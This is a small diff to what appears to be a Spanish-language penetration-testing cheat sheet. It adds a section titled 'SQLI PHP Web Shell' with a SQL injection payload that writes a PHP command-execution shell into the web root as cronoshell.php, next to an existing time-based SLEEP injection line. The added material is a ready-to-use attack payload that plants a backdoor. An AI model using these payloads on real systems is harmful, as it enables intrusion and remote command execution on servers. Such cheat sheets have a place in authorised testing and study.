@@ -104,6 +104,11 @@ Injección
 UNION SELECT SLEEP(5),2,...; - --
 ```
 
+## SQLI PHP Web Shell
+```
+select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
+```
+
 # Powershell
 
 Descargar binarios
